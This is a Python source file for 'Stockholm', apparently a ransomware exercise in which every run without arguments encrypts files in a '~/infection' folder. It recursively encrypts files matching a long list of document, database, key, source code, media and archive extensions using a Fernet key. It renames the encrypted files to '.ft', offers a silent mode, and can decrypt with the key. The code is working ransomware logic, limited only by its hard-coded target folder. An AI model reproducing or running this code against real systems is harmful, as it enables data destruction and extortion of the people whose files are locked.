from cryptography.fernet import Fernet
import shutil
import sys
import os
from os import remove

class bcolors:
    OK = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"

def blockPrint():
    sys.stdout = open(os.devnull, 'w')

def ver_key():
    here = os.listdir(".")
    for file in here:
        if file == "key.key":
            return 0
    return 1

def create_key():
    key = Fernet.generate_key()  
    with open('key.key', 'wb') as filekey: 
        filekey.write(key)

def get_key():
    with open('key.key', 'rb') as filekey: 
        return(filekey.read())

def encrypt_files(path, file_name, name):
    with open('key.key', 'rb') as filekey: 
        key = filekey.read()
    try:
        fernet = Fernet(key)
    except:
        print(bcolors.FAIL + "Error: invalid key" + bcolors.RESET)
        exit()
    try:
        with open(path + file_name, 'rb') as file: 
            original = file.read()
    except:
        print(bcolors.FAIL + "Problems opening the file {}" .format(file_name) + bcolors.RESET)
        return
    encrypted = fernet.encrypt(original)
    try:
        with open(path + file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        print(bcolors.FAIL + "Problems opening the file {}" .format(file_name) + bcolors.RESET) 
        return
    complete = path + file_name
    shutil.copy(complete, path + name[0] + name[1] + ".ft")
    remove(complete)
    print (bcolors.OK + "{} encrypted" .format(file_name) + bcolors.RESET)
    return (1)

def decrypt_files(complete, path, file_name, key):
    name, ext = os.path.splitext(file_name)
    try:
        fernet = Fernet(key)
    except:
        print(bcolors.FAIL + "Error: invalid key" + bcolors.RESET)
        exit()
    try:
        with open(path + file_name, 'rb') as file: 
            encrypted = file.read()
    except:
        print(bcolors.FAIL + "Problems opening the file {}" .format(file_name) + bcolors.RESET)
        return
    try:
        decrypted = fernet.decrypt(encrypted)
    except:
        print(bcolors.FAIL + "Error: file \"{}\" not encrypted or invalid key to decrypt" .format(file_name) + bcolors.RESET)
        return
    try:
        with open(path + file_name, 'wb') as encrypted_file:
            encrypted_file.write(decrypted)
    except:
        print(bcolors.FAIL + "Problems opening the file {}" .format(file_name) + bcolors.RESET)
        return

    print(bcolors.OK + "{} decrypted" .format(file_name) + bcolors.RESET)
    shutil.copy(complete, path + name)
    remove(complete)

def process_files(content, extentions, path):
    if ver_key() == 1:
        print(bcolors.FAIL + "Error: key not found, please create a key" + bcolors.RESET)
        exit()
    files = 0
    for file in content:
        if os.path.isdir(path + file) == True:
            newpath = path + file + "/"
            newcontent = os.listdir(os.path.expanduser(newpath))
            process_files(newcontent, extentions, newpath)
        name = os.path.splitext(file)
        for list in extentions:
            if list == name[1]:
                if name[1] != ".ft":
                    files = files + encrypt_files(path , file, name)
    if files == 0:
        print(bcolors.FAIL + "Error: directory empty or files with invalid extension for encrypt " + path + bcolors.RESET)

def reverse_files(argv, command, content, extentions, path, key):
    files = 0
    if key == None:
        print(bcolors.FAIL + "Error: invalid key" + bcolors.RESET)
        exit()
    for file in content:
        if os.path.isdir(path + file) == True:
            newpath = path + file + "/"
            newcontent = os.listdir(os.path.expanduser(newpath))
            reverse_files(argv, command, newcontent, extentions, newpath, key)
        name, ext = os.path.splitext(file)
        if ext == ".ft":
                complete = path + file
                files = decrypt_files(complete, path, file, key)
    if files == 0:
        print(bcolors.FAIL + "Error: directory empty or files with invalid extension for encrypt " + path + bcolors.RESET)

def display_help():
    print("""Stockholm, version  0.1
usage: stockholm [-hkrsv] [key]

    h  : print this help message
    k  : generate a new key
    r  : decrypt all the files encrypted
    rk : decrypt all the files encrypted with the file "key.key" in the folder
    s  : execute the program without output
    v  : print program version
    
Example for encrypt:
stockholm

Example for decrypt:
stockholm -r KEY
stockholm -reverse KEY
stockholm -rk""")
    exit()

def ver_path():
    if os.path.exists(path) == False:
        print(bcolors.FAIL + "Error directory \"infection\" not found" + bcolors.RESET)
        exit()
    return 0

def main():
    extentions = [".der", ".pfx", ".key", ".cr", ".csr", ".p12", ".pem", ".od", ".o", ".sxw", ".stw", ".uo", ".3ds", ".max", ".3dm", ".txt", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".ba", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".sn", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".tx", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".os", ".ps", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".po", ".pptm", ".pptx", ".pp", ".xltm", ".xltx", ".xlc", ".xlm", ".xl", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".do", ".docm", ".docb", ".docx", ".doc"]
    path = os.path.expanduser('~/infection/')
    """if sys.argv[1] == "-v" or sys.argv[1] == "-version":
        print("Stockholm 0.1")
        exit()
    if sys.argv[1] == "-h" or sys.argv[1] == "-help":
        help()
        exit()"""
    """if os.path.exists(path) == False:
        print(bcolors.FAIL + "Error directory \"infection\" not found" + bcolors.RESET)
        exit()"""
    command = 1
    if len(sys.argv) == 1:
        if os.path.exists(path) == False:
            print(bcolors.FAIL + "Error directory \"infection\" not found" + bcolors.RESET)
            exit()
        else:
            content = os.listdir(os.path.expanduser('~/infection'))
            print("Encrypting ...")
            process_files(content, extentions, path)
    else:
        if sys.argv[command] == "-s" or sys.argv[command] == "-silence":
            blockPrint()
            if len(sys.argv) > 2:
                command = 2
        if sys.argv[command] == "-v" or sys.argv[command] == "-version":
            print("Stockholm 0.1")
            exit()
        if sys.argv[command] == "-h" or sys.argv[command] == "-help":
            display_help()
            exit()
        if os.path.exists(path) == False:
            print(bcolors.FAIL + "Error directory \"infection\" not found" + bcolors.RESET)
            exit()
        else:
            content = os.listdir(os.path.expanduser('~/infection'))
        if sys.argv[command] == "-k" or sys.argv[command] == "-key":
            create_key()
            print(bcolors.OK + "New key created" + bcolors.RESET)
            exit()
        if sys.argv[command] == "-r" or sys.argv[command] == "-reverse":
            if len(sys.argv) == command + 1:
                print(bcolors.FAIL + "Error: invalid key" + bcolors.RESET)
                exit()
            print("Descrypting ...")
            reverse_files(sys.argv, command, content, extentions, path, sys.argv[command + 1])
        elif sys.argv[command] == "-rk" or sys.argv[command] == "-reversekey":
            key = get_key()
            print("Descrypting ...")
            reverse_files(sys.argv, command, content, extentions, path, key)
        elif sys.argv[command] == None or len(sys.argv) == 2:
            print("Encrypting ...")
            process_files(content, extentions, path)

if __name__ == "__main__":
    main()